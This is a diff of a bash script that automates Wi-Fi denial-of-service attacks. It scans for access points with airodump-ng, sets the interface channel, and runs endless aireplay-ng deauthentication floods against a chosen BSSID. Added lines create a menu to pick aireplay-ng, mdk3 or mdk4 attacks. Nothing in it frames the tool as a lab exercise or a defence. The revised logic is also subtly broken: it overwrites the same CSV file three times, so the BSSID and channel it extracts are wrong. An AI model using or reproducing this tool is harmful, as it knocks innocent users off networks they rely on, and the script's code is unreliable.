@@ -75,7 +75,7 @@ if [ $aircrackCheck == "false" ]; then
 else
     echo "aircrack-ng is installed"
 fi
-sudo cd ~/Desktop
+sudo cd Desktop
 #user input for a AP's name
 read -p "Enter the AP's name: " AP
 sleep 1
@@ -128,65 +128,23 @@ For_aireplay () {
     fi
     echo "all files deleted or non existent"
     sleep 1
-    echo "starting airodump-ng to find $AP, this will take 30 seconds"
-    sudo timeout 30 airodump-ng -b abg -N "$AP" wlan0 --write wlan0 --output-format csv
+    echo "starting airodump-ng to find APs, this will take 30 seconds"
+    sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
     sleep 32
-    cat wlan0-01.csv | grep $AP > bssid.csv
-    cat bssid.csv | sed 's/,//g' > bssid1.csv
-    checknumberofbssids=$(cat bssid1.csv | awk '{print $1}' | wc -l)
-    if [ $checknumberofbssids \> 1 ]; then
-        echo "multiple bssids found"
-        cat bssid1.csv | awk '{print}'
-        cat bssid1.csv | awk '{print $1}' 
-        read -p "which bssid do you want to use? type the whole mac address: " bssid
-        echo "you chose $bssid"
-        cat bssid1.csv | grep $bssid > bssid2.csv
-        usedbssid=$(cat bssid2.csv | awk '{print $1}')
-        usedchannel=$(cat bssid2.csv | awk '{print $6}') 
-        echo "changing channel to $usedchannel"
-        sleep 1
-        sudo iwconfig wlan0 channel $usedchannel
-        echo "starting aireplay-ng attack" 
-        sleep 1
-        read -p "how long do you want to run the attack for? (in seconds): " time
-        if [ $time == "0" ]; then
-            echo "running attack until you stop it"
-            sudo aireplay-ng -0 0 -a $usedbssid wlan0
-        elif [[ -n ${time//[0-9]/} ]]; then
-            echo "invalid input"
-            sleep 1 
-            echo "running attack until you stop it (ctrl c)"
-            sudo aireplay-ng -0 0 -a $usedbssid wlan0
-
-        else
-            echo "running attack for $time seconds"
-            sudo aireplay-ng -0 $time -a $usedbssid wlan0
-            echo "attack finished"
-            sleep 1 
-        fi
-    else
-        echo "only one bssid found"
-        thebssid=$(cat bssid1.csv | awk '{print $1}')
-        thechannel=$(cat bssid1.csv | awk '{print $6}')
-        echo "changing channel to $thechannel"
-        sleep 1
-        sudo iwconfig wlan0 channel $thechannel
-        read -p "how long do you want to run the attack for? (in seconds): " time2
-        if [ $time2 == "0" ]; then
-            echo "running attack until you stop it"
-            sudo aireplay-ng -0 0 -a $thebssid wlan0
-        elif [[ -n ${time2//[0-9]/} ]]; then
-            echo "invalid input"
-            sleep 1 
-            echo "running attack until you stop it (ctrl c)"
-            sudo aireplay-ng -0 0 -a $thebssid wlan0
-        else
-            echo "running attack for $time2 seconds"
-            sudo aireplay-ng -0 $time2 -a $thebssid wlan0
-            echo "attack finished"
-            sleep 1
-        fi
-    fi
+    cat wlan0-01.csv | sed 's/,//g' > bssid1.csv
+    cat bssid1.csv | awk '{print $1}' > bssid.csv
+    cat bssid1.csv | awk '{print $6}' > bssid.csv   
+    cat bssid1.csv | awk '{print $10}' > bssid.csv
+    cat bssid.csv | awk '{print}'
+    read -p "which AP?: " AP
+    echo "you chose $AP"
+    cat bssid.csv | grep $AP > bssid2.csv
+    usedbssid=$(cat bssid2.csv | awk '{print $1}')
+    channelused=$(cat bssid2.csv | awk '{print $2}')
+    echo "changing channel to $channelused"
+    sudo iwconfig wlan0 channel $channelused
+    echo "starting aireplay-ng deauth attack"
+    sudo aireplay-ng -0 0 -a $usedbssid wlan0
 }
 
 
@@ -259,7 +217,6 @@ For_mdk3 () {
         exit 1
     fi
 }
-
 
 
 For_mdk4 () {
@@ -341,6 +298,18 @@ For_mdk4 () {
         exit 1
     fi
 }
+
+read -p "which attack do you want to use? aireplay-ng(1), mdk3(2) or mdk4(3): " attack
+if [ $attack == 1 ]; then
+    For_aireplay
+elif [ $attack == 2 ]; then
+    For_mdk3
+elif [ $attack == 3 ]; then
+    For_mdk4
+else
+    echo "invalid input"
+    exit 1
+fi
 
 
 
